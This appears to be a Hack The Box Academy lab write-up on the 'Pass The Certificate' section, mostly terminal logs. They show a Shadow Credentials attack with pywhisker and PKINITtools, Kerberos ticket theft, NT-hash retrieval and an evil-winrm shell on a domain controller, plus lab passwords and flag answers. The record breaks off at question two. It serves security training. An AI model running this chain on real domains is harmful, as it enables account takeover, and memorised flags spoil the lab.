# Section 23: Pass The Certificate

Module: 10. Password Attacks

---

## Questions & Answers

### 1. What are the contents of flag.txt on jpinkman's desktop?

Context:
```bash
┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~/PKINITtools]
└──╼ [★]$ sudo vim /etc/hosts
┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~/PKINITtools]
└──╼ [★]$ sudo vim /etc/krb5.conf
┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~/PKINITtools]
└──╼ [★]$ pywhisker --dc-ip 10.129.234.174 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
bash: pywhisker: command not found
┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~/PKINITtools]
└──╼ [★]$ pipx install pywhisker
  installed package pywhisker 0.1.2, installed using Python 3.13.5
  These apps are now globally available
    - pywhisker
done! ✨ 🌟 ✨
┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~/PKINITtools]
└──╼ [★]$ pywhisker --dc-ip 10.129.234.174 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
[*] Searching for the target account
[*] Target user found: CN=Jesse Pinkman,CN=Users,DC=inlanefreight,DC=local
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: f54a17cb-0f6f-9118-947a-fceb88a33669
[*] Updating the msDS-KeyCredentialLink attribute of jpinkman
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: XpgqQGdi.pfx
[*] Must be used with password: YAzMIQUQGhTtKAnWhakW
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~/PKINITtools]
└──╼ [★]$ git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
Cloning into 'PKINITtools'...
remote: Enumerating objects: 45, done.
remote: Counting objects: 100% (18/18), done.
remote: Compressing objects: 100% (8/8), done.
remote: Total 45 (delta 14), reused 10 (delta 10), pack-reused 27 (from 1)
Receiving objects: 100% (45/45), 28.08 KiB | 28.08 MiB/s, done.
Resolving deltas: 100% (21/21), done.
┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~/PKINITtools/PKINITtools]
└──╼ [★]$ python3 -m venv .venv && source .venv/bin/activate
(.venv) ┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~/PKINITtools/PKINITtools]
└──╼ [★]$ pip3 install -r requirements.txt
Collecting impacket (from -r requirements.txt (line 1))
  Downloading impacket-0.13.1-py3-none-any.whl.metadata (6.0 kB)
Collecting minikerberos (from -r requirements.txt (line 2))
  Downloading minikerberos-0.4.9-py3-none-any.whl.metadata (735 bytes)
Collecting pyasn1>=0.2.3 (from impacket->-r requirements.txt (line 1))
  Downloading pyasn1-0.6.4-py3-none-any.whl.metadata (8.4 kB)
Collecting pyasn1_modules (from impacket->-r requirements.txt (line 1))
  Using cached pyasn1_modules-0.4.2-py3-none-any.whl.metadata (3.5 kB)
Collecting pycryptodomex (from impacket->-r requirements.txt (line 1))
  Using cached pycryptodomex-3.23.0-cp37-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (3.4 kB)
Collecting pyOpenSSL (from impacket->-r requirements.txt (line 1))
  Downloading pyopenssl-26.4.0-py3-none-any.whl.metadata (22 kB)
Collecting six (from impacket->-r requirements.txt (line 1))
  Downloading six-1.17.0-py2.py3-none-any.whl.metadata (1.7 kB)
Collecting ldap3!=2.5.0,!=2.5.2,!=2.6,>=2.5 (from impacket->-r requirements.txt (line 1))
  Using cached ldap3-2.9.1-py2.py3-none-any.whl.metadata (5.4 kB)
Collecting ldapdomaindump>=0.9.0 (from impacket->-r requirements.txt (line 1))
  Downloading ldapdomaindump-0.10.0-py3-none-any.whl.metadata (512 bytes)
Collecting flask>=1.0 (from impacket->-r requirements.txt (line 1))
  Using cached flask-3.1.3-py3-none-any.whl.metadata (3.2 kB)
Collecting charset_normalizer (from impacket->-r requirements.txt (line 1))
  Using cached charset_normalizer-3.4.9-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl.metadata (41 kB)
Collecting asn1crypto>=1.5.1 (from minikerberos->-r requirements.txt (line 2))
  Downloading asn1crypto-1.5.1-py2.py3-none-any.whl.metadata (13 kB)
Collecting oscrypto>=1.3.0 (from minikerberos->-r requirements.txt (line 2))
  Downloading oscrypto-1.3.0-py2.py3-none-any.whl.metadata (15 kB)
Collecting asysocks>=0.2.18 (from minikerberos->-r requirements.txt (line 2))
  Downloading asysocks-0.2.18-py3-none-any.whl.metadata (435 bytes)
Collecting unicrypto>=0.0.12 (from minikerberos->-r requirements.txt (line 2))
  Downloading unicrypto-0.0.12-py3-none-any.whl.metadata (386 bytes)
Collecting tqdm (from minikerberos->-r requirements.txt (line 2))
  Downloading tqdm-4.70.0-py3-none-any.whl.metadata (57 kB)
Collecting cryptography (from asysocks>=0.2.18->minikerberos->-r requirements.txt (line 2))
  Downloading cryptography-50.0.0-cp311-abi3-manylinux_2_34_x86_64.whl.metadata (4.3 kB)
Collecting h11>=0.14.0 (from asysocks>=0.2.18->minikerberos->-r requirements.txt (line 2))
  Downloading h11-0.16.0-py3-none-any.whl.metadata (8.3 kB)
Collecting blinker>=1.9.0 (from flask>=1.0->impacket->-r requirements.txt (line 1))
  Using cached blinker-1.9.0-py3-none-any.whl.metadata (1.6 kB)
Collecting click>=8.1.3 (from flask>=1.0->impacket->-r requirements.txt (line 1))
  Using cached click-8.4.2-py3-none-any.whl.metadata (2.6 kB)
Collecting itsdangerous>=2.2.0 (from flask>=1.0->impacket->-r requirements.txt (line 1))
  Using cached itsdangerous-2.2.0-py3-none-any.whl.metadata (1.9 kB)
Collecting jinja2>=3.1.2 (from flask>=1.0->impacket->-r requirements.txt (line 1))
  Using cached jinja2-3.1.6-py3-none-any.whl.metadata (2.9 kB)
Collecting markupsafe>=2.1.1 (from flask>=1.0->impacket->-r requirements.txt (line 1))
  Using cached markupsafe-3.0.3-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl.metadata (2.7 kB)
Collecting werkzeug>=3.1.0 (from flask>=1.0->impacket->-r requirements.txt (line 1))
  Using cached werkzeug-3.1.8-py3-none-any.whl.metadata (4.0 kB)
Collecting dnspython (from ldapdomaindump>=0.9.0->impacket->-r requirements.txt (line 1))
  Using cached dnspython-2.8.0-py3-none-any.whl.metadata (5.7 kB)
Collecting cffi>=2.0.0 (from cryptography->asysocks>=0.2.18->minikerberos->-r requirements.txt (line 2))
  Using cached cffi-2.1.1-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.whl.metadata (2.5 kB)
Collecting pycparser (from cffi>=2.0.0->cryptography->asysocks>=0.2.18->minikerberos->-r requirements.txt (line 2))
  Using cached pycparser-3.0-py3-none-any.whl.metadata (8.2 kB)
Downloading impacket-0.13.1-py3-none-any.whl (1.8 MB)
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.8/1.8 MB 47.8 MB/s eta 0:00:00
Downloading minikerberos-0.4.9-py3-none-any.whl (162 kB)
Downloading asn1crypto-1.5.1-py2.py3-none-any.whl (105 kB)
Downloading asysocks-0.2.18-py3-none-any.whl (149 kB)
Using cached flask-3.1.3-py3-none-any.whl (103 kB)
Using cached blinker-1.9.0-py3-none-any.whl (8.5 kB)
Using cached click-8.4.2-py3-none-any.whl (119 kB)
Downloading h11-0.16.0-py3-none-any.whl (37 kB)
Using cached itsdangerous-2.2.0-py3-none-any.whl (16 kB)
Using cached jinja2-3.1.6-py3-none-any.whl (134 kB)
Using cached ldap3-2.9.1-py2.py3-none-any.whl (432 kB)
Downloading ldapdomaindump-0.10.0-py3-none-any.whl (19 kB)
Using cached markupsafe-3.0.3-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl (22 kB)
Downloading oscrypto-1.3.0-py2.py3-none-any.whl (194 kB)
Downloading pyasn1-0.6.4-py3-none-any.whl (84 kB)
Downloading unicrypto-0.0.12-py3-none-any.whl (75 kB)
Using cached werkzeug-3.1.8-py3-none-any.whl (226 kB)
Using cached charset_normalizer-3.4.9-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl (223 kB)
Downloading cryptography-50.0.0-cp311-abi3-manylinux_2_34_x86_64.whl (4.7 MB)
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 4.7/4.7 MB 237.3 MB/s eta 0:00:00
Using cached cffi-2.1.1-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.whl (221 kB)
Using cached dnspython-2.8.0-py3-none-any.whl (331 kB)
Downloading pyasn1_modules-0.4.2-py3-none-any.whl (181 kB)
Using cached pycparser-3.0-py3-none-any.whl (48 kB)
Using cached pycryptodomex-3.23.0-cp37-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.3 MB)
Downloading pyopenssl-26.4.0-py3-none-any.whl (56 kB)
Downloading six-1.17.0-py2.py3-none-any.whl (11 kB)
Downloading tqdm-4.70.0-py3-none-any.whl (80 kB)
Installing collected packages: asn1crypto, tqdm, six, pycryptodomex, pycparser, pyasn1, oscrypto, markupsafe, itsdangerous, h11, dnspython, click, charset_normalizer, blinker, werkzeug, unicrypto, pyasn1_modules, ldap3, jinja2, cffi, ldapdomaindump, flask, cryptography, pyOpenSSL, asysocks, minikerberos, impacket
Successfully installed asn1crypto-1.5.1 asysocks-0.2.18 blinker-1.9.0 cffi-2.1.1 charset_normalizer-3.4.9 click-8.4.2 cryptography-50.0.0 dnspython-2.8.0 flask-3.1.3 h11-0.16.0 impacket-0.13.1 itsdangerous-2.2.0 jinja2-3.1.6 ldap3-2.9.1 ldapdomaindump-0.10.0 markupsafe-3.0.3 minikerberos-0.4.9 oscrypto-1.3.0 pyOpenSSL-26.4.0 pyasn1-0.6.4 pyasn1_modules-0.4.2 pycparser-3.0 pycryptodomex-3.23.0 six-1.17.0 tqdm-4.70.0 unicrypto-0.0.12 werkzeug-3.1.8
(.venv) ┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~/PKINITtools/PKINITtools]
└──╼ [★]$ python3 gettgtpkinit.py -cert-pfx ../<name>.pfx -pfx-pass '<password-from-step2>' \
  -dc-ip 10.129.234.174 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
bash: name: No such file or directory
(.venv) ┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~/PKINITtools/PKINITtools]
└──╼ [★]$ python3 gettgtpkinit.py -cert-pfx ../XpgqQGdi.pfx -pfx-pass 'YAzMIQUQGhTtKAnWhakW' -dc-ip 10.129.234.174 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
2026-08-05 04:45:41,909 minikerberos INFO     Loading certificate and key from file
2026-08-05 04:45:41,919 minikerberos INFO     Requesting TGT
2026-08-05 04:46:05,767 minikerberos INFO     AS-REP encryption key (you might need this later):
2026-08-05 04:46:05,767 minikerberos INFO     caed5604a79fb0e2e5bba88c26ccceb6b5dc7f8821e206d70eafaa95c3514450
2026-08-05 04:46:05,771 minikerberos INFO     Saved TGT to file
(.venv) ┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~/PKINITtools/PKINITtools]
└──╼ [★]$ export KRB5CCNAME=/tmp/jpinkman.ccache
(.venv) ┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~/PKINITtools/PKINITtools]
└──╼ [★]$ klist
Ticket cache: FILE:/tmp/jpinkman.ccache
Default principal: jpinkman@INLANEFREIGHT.LOCAL

Valid starting       Expires              Service principal
08/05/2026 04:45:42  08/05/2026 14:45:42  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL
(.venv) ┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~/PKINITtools/PKINITtools]
└──╼ [★]$ evil-winrm -i ptcdc01.inlanefreight.local -r inlanefreight.local
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type GSSAPI::GssApiError happened, message is gss_init_sec_context did not return GSS_S_COMPLETE: Unspecified GSS failure.  Minor code may provide more information
Server not found in Kerberos database

                                        
Error: Exiting with code 1
(.venv) ┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~/PKINITtools/PKINITtools]
└──╼ [★]$ evil-winrm -i ptcca01.inlanefreight.local -r inlanefreight.local
\                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type GSSAPI::GssApiError happened, message is gss_init_sec_context did not return GSS_S_COMPLETE: Unspecified GSS failure.  Minor code may provide more information
Server not found in Kerberos database

                                        
Error: Exiting with code 1
(.venv) ┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~/PKINITtools/PKINITtools]
└──╼ [★]$ evil-winrm -i ptcca01.inlanefreight.local -r inlanefreight.local
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type GSSAPI::GssApiError happened, message is gss_init_sec_context did not return GSS_S_COMPLETE: Unspecified GSS failure.  Minor code may provide more information
Server not found in Kerberos database

                                        
Error: Exiting with code 1
(.venv) ┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~/PKINITtools/PKINITtools]
└──╼ [★]$ sudo vim /etc/hosts
(.venv) ┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~/PKINITtools/PKINITtools]
└──╼ [★]$ sudo vim /etc/krb5.conf
(.venv) ┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~/PKINITtools/PKINITtools]
└──╼ [★]$ evil-winrm -i academy-pwattck-ptcdc01.inlanefreight.local -r inlanefreight.local
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type GSSAPI::GssApiError happened, message is gss_init_sec_context did not return GSS_S_COMPLETE: Unspecified GSS failure.  Minor code may provide more information
Server not found in Kerberos database

                                        
Error: Exiting with code 1
(.venv) ┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~/PKINITtools/PKINITtools]
└──╼ [★]$ cat /etc/hosts
127.0.0.1   localhost
127.0.0.1	localhost
127.0.1.1	pwnbox7.1

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
127.0.0.1 localhost
127.0.1.1 htb-vkrahbv0kp htb-vkrahbv0kp.htb-cloud.com
10.129.234.174   ptcdc01.inlanefreight.local ptcdc01
10.129.234.172   ptcca01.inlanefreight.local ptcca01
10.129.234.174   academy-pwattck-ptcdc01.inlanefreight.local academy-pwattck-ptcdc01
10.129.234.172   academy-pwattck-ptcca01.inlanefreight.local academy-pwattck-ptcca01
(.venv) ┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~/PKINITtools/PKINITtools]
└──╼ [★]$ cat /etc/krb5.conf 
[libdefaults]
	default_realm = ATHENA.MIT.EDU

# The following krb5.conf variables are only for MIT Kerberos.
	kdc_timesync = 1
	ccache_type = 4
	forwardable = true
	proxiable = true
        rdns = false


# The following libdefaults parameters are only for Heimdal Kerberos.
	fcc-mit-ticketflags = true

[realms]
	ATHENA.MIT.EDU = {
		kdc = kerberos.mit.edu
		kdc = kerberos-1.mit.edu
		kdc = kerberos-2.mit.edu:88
		admin_server = kerberos.mit.edu
		default_domain = mit.edu
	}
	ZONE.MIT.EDU = {
		kdc = casio.mit.edu
		kdc = seiko.mit.edu
		admin_server = casio.mit.edu
	}
	CSAIL.MIT.EDU = {
		admin_server = kerberos.csail.mit.edu
		default_domain = csail.mit.edu
	}
	IHTFP.ORG = {
		kdc = kerberos.ihtfp.org
		admin_server = kerberos.ihtfp.org
	}
	1TS.ORG = {
		kdc = kerberos.1ts.org
		admin_server = kerberos.1ts.org
	}
	ANDREW.CMU.EDU = {
		admin_server = kerberos.andrew.cmu.edu
		default_domain = andrew.cmu.edu
	}
        CS.CMU.EDU = {
                kdc = kerberos-1.srv.cs.cmu.edu
                kdc = kerberos-2.srv.cs.cmu.edu
                kdc = kerberos-3.srv.cs.cmu.edu
                admin_server = kerberos.cs.cmu.edu
        }
	DEMENTIA.ORG = {
		kdc = kerberos.dementix.org
		kdc = kerberos2.dementix.org
		admin_server = kerberos.dementix.org
	}
	stanford.edu = {
		kdc = krb5auth1.stanford.edu
		kdc = krb5auth2.stanford.edu
		kdc = krb5auth3.stanford.edu
		master_kdc = krb5auth1.stanford.edu
		admin_server = krb5-admin.stanford.edu
		default_domain = stanford.edu
	}
        UTORONTO.CA = {
                kdc = kerberos1.utoronto.ca
                kdc = kerberos2.utoronto.ca
                kdc = kerberos3.utoronto.ca
                admin_server = kerberos1.utoronto.ca
                default_domain = utoronto.ca
	}

[domain_realm]
	.mit.edu = ATHENA.MIT.EDU
	mit.edu = ATHENA.MIT.EDU
	.media.mit.edu = MEDIA-LAB.MIT.EDU
	media.mit.edu = MEDIA-LAB.MIT.EDU
	.csail.mit.edu = CSAIL.MIT.EDU
	csail.mit.edu = CSAIL.MIT.EDU
	.whoi.edu = ATHENA.MIT.EDU
	whoi.edu = ATHENA.MIT.EDU
	.stanford.edu = stanford.edu
	.slac.stanford.edu = SLAC.STANFORD.EDU
        .toronto.edu = UTORONTO.CA
        .utoronto.ca = UTORONTO.CA
[libdefaults]
    default_realm = INLANEFREIGHT.LOCAL
    dns_lookup_realm = false
    dns_lookup_kdc = false

[domain_realm]
    .inlanefreight.local = INLANEFREIGHT.LOCAL
    inlanefreight.local = INLANEFREIGHT.LOCAL
[realms]
    INLANEFREIGHT.LOCAL = {
        kdc = academy-pwattck-ptcdc01.inlanefreight.local
        admin_server = academy-pwattck-ptcdc01.inlanefreight.local
    }
(.venv) ┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~/PKINITtools/PKINITtools]
└──╼ [★]$ sudo bash -c 'cat > /etc/krb5.conf' << 'EOF'
[libdefaults]
    default_realm = INLANEFREIGHT.LOCAL
    dns_lookup_realm = false
    dns_lookup_kdc = false
    rdns = false

[realms]
    INLANEFREIGHT.LOCAL = {
        kdc = academy-pwattck-ptcdc01.inlanefreight.local
        admin_server = academy-pwattck-ptcdc01.inlanefreight.local
    }

[domain_realm]
    .inlanefreight.local = INLANEFREIGHT.LOCAL
    inlanefreight.local = INLANEFREIGHT.LOCAL
EOF
(.venv) ┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~/PKINITtools/PKINITtools]
└──╼ [★]$ evil-winrm -i academy-pwattck-ptcdc01.inlanefreight.local -r inlanefreight.local
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type GSSAPI::GssApiError happened, message is gss_init_sec_context did not return GSS_S_COMPLETE: Unspecified GSS failure.  Minor code may provide more information
Server not found in Kerberos database

                                        
Error: Exiting with code 1
(.venv) ┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~/PKINITtools/PKINITtools]
└──╼ [★]$ cat /etc/krb5.conf 
[libdefaults]
    default_realm = INLANEFREIGHT.LOCAL
    dns_lookup_realm = false
    dns_lookup_kdc = false
    rdns = false

[realms]
    INLANEFREIGHT.LOCAL = {
        kdc = academy-pwattck-ptcdc01.inlanefreight.local
        admin_server = academy-pwattck-ptcdc01.inlanefreight.local
    }

[domain_realm]
    .inlanefreight.local = INLANEFREIGHT.LOCAL
    inlanefreight.local = INLANEFREIGHT.LOCAL
(.venv) ┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~/PKINITtools/PKINITtools]
└──╼ [★]$ nslookup 10.129.234.174 10.129.234.174
;; communications error to 10.129.234.174#53: timed out
;; communications error to 10.129.234.174#53: timed out
;; communications error to 10.129.234.174#53: timed out
;; no servers could be reached

(.venv) ┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~/PKINITtools/PKINITtools]
└──╼ [★]$ nslookup 10.129.234.172 10.129.234.174
;; communications error to 10.129.234.174#53: timed out
;; communications error to 10.129.234.174#53: timed out
;; communications error to 10.129.234.174#53: timed out
;; no servers could be reached

(.venv) ┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~/PKINITtools/PKINITtools]
└──╼ [★]$ KRB5_TRACE=/dev/stdout evil-winrm -i academy-pwattck-ptcdc01.inlanefreight.local -r inlanefreight.local
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
[226879] 1785920098.933458: ccselect module realm chose cache FILE:/tmp/jpinkman.ccache with client principal jpinkman@INLANEFREIGHT.LOCAL for server principal HTTP/academy-pwattck-ptcdc01.inlanefreight.local@INLANEFREIGHT.LOCAL
[226879] 1785920098.933459: Getting credentials jpinkman@INLANEFREIGHT.LOCAL -> HTTP/academy-pwattck-ptcdc01.inlanefreight.local@INLANEFREIGHT.LOCAL using ccache FILE:/tmp/jpinkman.ccache
[226879] 1785920098.933460: Retrieving jpinkman@INLANEFREIGHT.LOCAL -> krb5_ccache_conf_data/start_realm@X-CACHECONF: from FILE:/tmp/jpinkman.ccache with result: -1765328243/Matching credential not found (filename: /tmp/jpinkman.ccache)
[226879] 1785920098.933461: Retrieving jpinkman@INLANEFREIGHT.LOCAL -> HTTP/academy-pwattck-ptcdc01.inlanefreight.local@INLANEFREIGHT.LOCAL from FILE:/tmp/jpinkman.ccache with result: -1765328243/Matching credential not found (filename: /tmp/jpinkman.ccache)
[226879] 1785920098.933462: Retrieving jpinkman@INLANEFREIGHT.LOCAL -> krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL from FILE:/tmp/jpinkman.ccache with result: 0/Success
[226879] 1785920098.933463: Starting with TGT for client realm: jpinkman@INLANEFREIGHT.LOCAL -> krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL
[226879] 1785920098.933464: Requesting tickets for HTTP/academy-pwattck-ptcdc01.inlanefreight.local@INLANEFREIGHT.LOCAL, referrals on
[226879] 1785920098.933465: Generated subkey for TGS request: aes256-cts/DC43
[226879] 1785920098.933466: etypes requested in TGS request: aes256-cts, aes128-cts, aes256-sha2, aes128-sha2, des3-cbc-sha1, rc4-hmac, camellia128-cts, camellia256-cts
[226879] 1785920098.933468: Encoding request body and padata into FAST request
[226879] 1785920098.933469: Sending request (2158 bytes) to INLANEFREIGHT.LOCAL
[226879] 1785920098.933470: Resolving hostname academy-pwattck-ptcdc01.inlanefreight.local
[226879] 1785920098.933471: Initiating TCP connection to stream 10.129.234.174:88
[226879] 1785920099.106766: Sending TCP request to stream 10.129.234.174:88
[226879] 1785920099.106767: Received answer (400 bytes) from stream 10.129.234.174:88
[226879] 1785920099.106768: Terminating TCP connection to stream 10.129.234.174:88
[226879] 1785920099.106769: Response was not from primary KDC
[226879] 1785920099.106770: Decoding FAST response
[226879] 1785920099.106771: TGS request result: -1765328377/Server not found in Kerberos database
[226879] 1785920099.106772: Requesting tickets for HTTP/academy-pwattck-ptcdc01.inlanefreight.local@INLANEFREIGHT.LOCAL, referrals off
[226879] 1785920099.106773: Generated subkey for TGS request: aes256-cts/65A2
[226879] 1785920099.106774: etypes requested in TGS request: aes256-cts, aes128-cts, aes256-sha2, aes128-sha2, des3-cbc-sha1, rc4-hmac, camellia128-cts, camellia256-cts
[226879] 1785920099.106776: Encoding request body and padata into FAST request
[226879] 1785920099.106777: Sending request (2158 bytes) to INLANEFREIGHT.LOCAL
[226879] 1785920099.106778: Resolving hostname academy-pwattck-ptcdc01.inlanefreight.local
[226879] 1785920099.106779: Initiating TCP connection to stream 10.129.234.174:88
[226879] 1785920099.106780: Sending TCP request to stream 10.129.234.174:88
[226879] 1785920099.106781: Received answer (400 bytes) from stream 10.129.234.174:88
[226879] 1785920099.106782: Terminating TCP connection to stream 10.129.234.174:88
[226879] 1785920099.106783: Response was not from primary KDC
[226879] 1785920099.106784: Decoding FAST response
[226879] 1785920099.106785: TGS request result: -1765328377/Server not found in Kerberos database
                                        
Error: An error of type GSSAPI::GssApiError happened, message is gss_init_sec_context did not return GSS_S_COMPLETE: Unspecified GSS failure.  Minor code may provide more information
Server not found in Kerberos database

                                        
Error: Exiting with code 1
(.venv) ┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~/PKINITtools/PKINITtools]
└──╼ [★]$ ldapsearch -x -H ldap://10.129.234.174 -D "wwhite@inlanefreight.local" -w 'package5shores_topher1' -b "DC=inlanefreight,DC=local" "(objectClass=computer)" dNSHostName
# extended LDIF
#
# LDAPv3
# base <DC=inlanefreight,DC=local> with scope subtree
# filter: (objectClass=computer)
# requesting: dNSHostName 
#

# DC01, Domain Controllers, inlanefreight.local
dn: CN=DC01,OU=Domain Controllers,DC=inlanefreight,DC=local
dNSHostName: DC01.inlanefreight.local

# CA01, Computers, inlanefreight.local
dn: CN=CA01,CN=Computers,DC=inlanefreight,DC=local
dNSHostName: CA01.inlanefreight.local

# search reference
ref: ldap://ForestDnsZones.inlanefreight.local/DC=ForestDnsZones,DC=inlanefrei
 ght,DC=local

# search reference
ref: ldap://DomainDnsZones.inlanefreight.local/DC=DomainDnsZones,DC=inlanefrei
 ght,DC=local

# search reference
ref: ldap://inlanefreight.local/CN=Configuration,DC=inlanefreight,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 6
# numEntries: 2
# numReferences: 3
(.venv) ┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~/PKINITtools/PKINITtools]
└──╼ [★]$ python3 getnthash.py -key caed5604a79fb0e2e5bba88c26ccceb6b5dc7f8821e206d70eafaa95c3514450 INLANEFREIGHT.LOCAL/jpinkman
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
[-] [Errno Connection error (INLANEFREIGHT.LOCAL:88)] [Errno -2] Name or service not known
(.venv) ┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~/PKINITtools/PKINITtools]
└──╼ [★]$ sudo bash -c 'cat >> /etc/hosts' << 'EOF'
10.129.234.174   DC01.inlanefreight.local DC01
10.129.234.172   CA01.inlanefreight.local CA01
EOF
(.venv) ┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~/PKINITtools/PKINITtools]
└──╼ [★]$ evil-winrm -i DC01.inlanefreight.local -r inlanefreight.local
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\jpinkman\Documents> dir C:\Users\jpinkman\Desktop


    Directory: C:\Users\jpinkman\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/28/2025  12:10 PM             32 flag.txt


*Evil-WinRM* PS C:\Users\jpinkman\Documents> type C:\Users\jpinkman\Desktop\flag.txt
3d7e3dfb56b200ef715cfc300f07f3f8
```

**Answer:** `3d7e3dfb56b200ef715cfc300f07f3f8`

---

### 2. What are the contents of flag.txt on Administrator's desktop?

Context:
- Terminal 1:
```bash
┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-vkrahbv0kp]─[~]
